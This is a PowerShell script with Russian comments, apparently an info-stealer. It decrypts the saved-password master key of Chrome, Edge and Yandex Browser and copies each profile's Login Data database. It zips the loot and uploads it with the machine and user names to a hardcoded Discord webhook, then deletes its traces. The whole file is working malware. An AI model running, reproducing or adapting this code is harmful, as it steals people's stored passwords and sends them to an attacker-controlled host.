# [ Конфигурация ]
$hookUrl = "https://discordapp.com/api/webhooks/1500921789273083906/Lo-Y6cSsllkNinCRaaCVj9Kttd27D_D8jLAC2cwZVvHvMQ5b87GqfM8oNrEtwxxTIyKt"
$tempDir = "$env:TEMP\sys_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
$logPath = "$tempDir\report.log"

Add-Type -AssemblyName System.Security

# Функция дешифровки мастер-ключа
function Get-Key($statePath, $label) {
    if (Test-Path $statePath) {
        try {
            $json = Get-Content $statePath -Raw | ConvertFrom-Json
            $rawKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            # Убираем префикс DPAPI (первые 5 байт) и дешифруем
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($rawKey[5..($rawKey.Length-1)], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            "[$($label)] Key: $([Convert]::ToBase64String($masterKey))" | Out-File -FilePath $logPath -Append -Encoding UTF8
            return $true
        } catch { return $false }
    }
    return $false
}

# 1. СБОР CHROMIUM (Chrome, Edge, Yandex)
$browsers = @(
    @{name="Chrome"; path="Google\Chrome\User Data"},
    @{name="Edge"; path="Microsoft\Edge\User Data"},
    @{name="Yandex"; path="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $userData = Join-Path $env:LOCALAPPDATA $b.path
    if (Test-Path $userData) {
        # Ищем все файлы Login Data в профилях
        $files = Get-ChildItem -Path $userData -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
        foreach ($f in $files) {
            $label = "$($b.name)_$($f.Directory.Name)"
            $state = Join-Path $userData "Local State"
            if (Get-Key $state $label) {
                # Копируем базу данных паролей для последующего анализа
                Copy-Item $f.FullName -Destination "$tempDir\$($label)_db" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# 2. УПАКОВКА И ОТПРАВКА В DISCORD
if ((Get-ChildItem $tempDir).Count -gt 0) {
    $zipPath = "$env:TEMP\rep_$(Get-Random).zip"
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force

    try {
        $client = New-Object System.Net.Http.HttpClient
        $content = New-Object System.Net.Http.MultipartFormDataContent
        
        $fileStream = [System.IO.File]::OpenRead($zipPath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        # Отправляем архив как вложение в Discord
        $content.Add($fileContent, "file", "report.zip")
        $content.Add((New-Object System.Net.Http.StringContent("Protocol 81: $env:COMPUTERNAME ($env:USERNAME)")), "content")
        
        $response = $client.PostAsync($hookUrl, $content).Result
        
        $fileStream.Close(); $fileStream.Dispose(); $content.Dispose(); $client.Dispose()
    } catch {}

    # Удаляем временный архив
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
}

# Полная очистка временной папки
Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
